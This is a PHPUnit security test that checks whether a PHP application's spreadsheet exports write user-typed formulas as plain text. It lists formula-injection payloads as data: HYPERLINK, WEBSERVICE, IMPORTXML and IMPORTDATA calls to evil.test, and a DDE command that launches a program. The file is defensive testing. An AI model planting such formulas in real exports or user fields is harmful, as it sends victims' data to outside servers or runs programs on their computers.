<?php

namespace Tests\Feature\Security;

use PHPUnit\Framework\Attributes\Group;
use Tests\Feature\Security\Support\Finding;
use Tests\TestCase;

/**
 * SPREADSHEET FORMULA INJECTION
 * ==================================================================
 * A user types   =HYPERLINK("http://evil","Click for your bonus")   as a customer name. Months later an accountant
 * exports the customers to Excel and opens the file. If the export writes that text as a FORMULA instead of as
 * plain text, Excel runs it: it can make the accountant's computer send data to a stranger's server or show a
 * link inside the company's own report.
 *
 *   SEC-38  The cell writer the exports use (config/excel.php, "value_binder") must keep dangerous formulas typed
 *           by a user as plain text.
 *
 * Harmless formulas the application writes itself (the =SUM() totals row) are NOT judged here: only formulas that
 * reach out of the spreadsheet (HYPERLINK, WEBSERVICE, IMPORT...) or start a program (cmd|, DDE).
 */
#[Group('security')]
class SpreadsheetFormulaSecurityTest extends TestCase
{
    private const DANGEROUS = [
        'a link dressed up as a label'   => '=HYPERLINK("http://evil.test/steal","Click here")',
        'a web request'                  => '=WEBSERVICE("http://evil.test/?x="&A1)',
        'a program launch (DDE)'         => "=cmd|' /C calc'!A0",
        'a data import'                  => '=IMPORTXML("http://evil.test","//a")',
        'a data import (second form)'    => '=IMPORTDATA("http://evil.test/x.csv")',
    ];

    public function test_dangerous_formulas_typed_by_a_user_stay_plain_text_in_exports(): void
    {
        if (! class_exists(\PhpOffice\PhpSpreadsheet\Spreadsheet::class)) {
            $this->markTestSkipped('PhpSpreadsheet is not installed.');
        }

        $binderClass = config('excel.value_binder.default');

        if (! is_string($binderClass) || ! class_exists($binderClass)) {
            $this->markTestSkipped('No value binder is configured in config/excel.php.');
        }

        $binder = new $binderClass;
        $sheet = (new \PhpOffice\PhpSpreadsheet\Spreadsheet)->getActiveSheet();

        // Control: ordinary text must be text, or the cell writer is not being exercised.
        $cell = $sheet->getCell('A1');
        $binder->bindValue($cell, 'Ahmed Hassan');
        $this->assertSame(\PhpOffice\PhpSpreadsheet\Cell\DataType::TYPE_STRING, $cell->getDataType(), 'Test set-up problem: ordinary text was not written as text.');

        $formulas = [];
        $row = 2;

        foreach (self::DANGEROUS as $label => $text) {
            $cell = $sheet->getCell('A'.$row++);
            $binder->bindValue($cell, $text);

            if ($cell->getDataType() === \PhpOffice\PhpSpreadsheet\Cell\DataType::TYPE_FORMULA) {
                $formulas[] = "{$label}: the text  {$text}  is written to the file as a live formula";
            }
        }

        $this->assertSame([], $formulas, Finding::message(
            'SEC-38', 'MEDIUM',
            'An export turns user-typed text into a live spreadsheet formula',
            $formulas,
            'Any name, note or description a user types is copied into exports. If it starts with "=", Excel treats it as a formula when the file is opened, so one user can make another user\'s computer contact an outside server or show a deceptive link.',
            'Use a safer value binder: write text that starts with = as plain text, and keep the application\'s own formulas (the =SUM() totals) through an explicit formula cell. Ask for the ready-made SafeValueBinder fix.'
        ));
    }
}
